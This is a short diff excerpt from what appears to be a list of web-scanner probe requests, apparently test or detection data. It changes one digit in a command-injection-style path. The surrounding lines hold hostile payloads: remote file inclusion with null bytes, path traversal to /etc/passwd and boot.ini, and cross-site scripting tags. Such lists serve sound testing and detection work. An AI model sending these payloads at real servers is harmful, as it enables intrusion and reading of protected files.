@@ -111,7 +111,7 @@
 /opensiteadmin/scripts/classes/filter.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00
 /manager/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00
 /iktok2bw.cfm?<script>cross_site_scripting.nasl</script>
-/help.php?q=del;q81588837&rem;
+/help.php?q=del;q8158837&rem;
 /en-us/dda2qr7j.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
 /javascript/~eric.exe
 /scripts/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini
